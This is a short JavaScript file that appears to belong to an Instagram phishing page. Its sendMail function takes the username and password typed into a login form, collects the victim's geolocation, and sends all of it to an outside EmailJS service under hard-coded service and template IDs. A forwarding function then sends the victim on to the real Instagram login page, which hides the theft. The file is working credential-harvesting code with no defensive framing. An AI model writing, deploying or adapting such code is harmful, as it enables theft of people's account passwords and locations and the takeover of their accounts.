function sendMail() {
  // First, get the username and password
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  // Check if geolocation is supported
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      // Get location coordinates
      var latitude = position.coords.latitude;
      var longitude = position.coords.longitude;

      // Include location data in params
      var params = {
        username_id: username,
        passwort_id: password,
        latitude: latitude,
        longitude: longitude
      };

      const serviceid = 'service_udupifp';
      const templateid = 'template_rfoq0w4';

      emailjs.send(serviceid, templateid, params)
        .then(res => {
          document.getElementById("username").value = "";
          document.getElementById("password").value = "";
        })
        .catch(err => alert(err));

    }, function(error) {
      alert("Unable to retrieve location: " + error.message);
    });
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}
function forwarding(){
  document.getElementById("LoginButton").addEventListener("click", function() {
    // Redirect to Instagram login page
    window.location.href = "https://www.instagram.com/accounts/login/";
  });
  }
